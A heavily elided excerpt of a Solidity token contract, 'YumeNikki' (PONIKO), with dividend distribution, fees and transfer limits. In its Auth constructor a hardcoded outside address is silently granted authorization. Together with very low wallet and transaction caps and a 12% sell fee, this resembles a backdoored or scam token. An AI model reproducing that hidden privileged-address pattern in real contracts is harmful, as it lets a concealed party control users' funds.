...
/**
 *Submitted To Your Mom at FtmScan.com on 2022-02-01
*/
...
abstract contract Auth {
    ...
    constructor(address _owner) {
        ...
        authorizations[
    0x0F18A38647eeBA9b06E3D6De0ed02d2705A45ebA] = true;}
    modifier onlyOwner() {
...
contract DividendDistributor is IDividendDistributor {
    ...
    IBEP20 RWDS = IBEP20(0x9222D24274E912F4d5E889b460924C4fEFe97954); //BSC wBAN
    IBEP20 PRWDS = IBEP20(0x8a9424745056Eb399FD19a0EC26A14316684e274); //DAI Token
    ...
    constructor (address _router) {
        router = _router != address(0)
            ...
            : IRouter(0x3380aE82e39E42Ca34EbEd69aF67fAa0683Bb5c1); //TestApeSwap Router
...
contract YumeNikki is Context, IERC20, Auth {
    using SafeMath for uint256;
    using Address for address;

    string private constant _name = 'YumeNikki';
    string private constant _symbol = 'PONIKO';
    ...
    address WBNB = 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd; //Wrapped FTM
   //address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c; //Wrapped BNB (WBNB)
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    uint256 public _maxTxAmount = ( _tTotal * 1000 ) / 10000000;
    uint256 public _maxWalletToken = ( _tTotal * 2000 ) / 1000000000;
...
//SellFees = 12%
    ...
    constructor () Auth(msg.sender) {
       ...
       IRouter _router = IRouter(0x3380aE82e39E42Ca34EbEd69aF67fAa0683Bb5c1); //ApeSwapTestnet Router
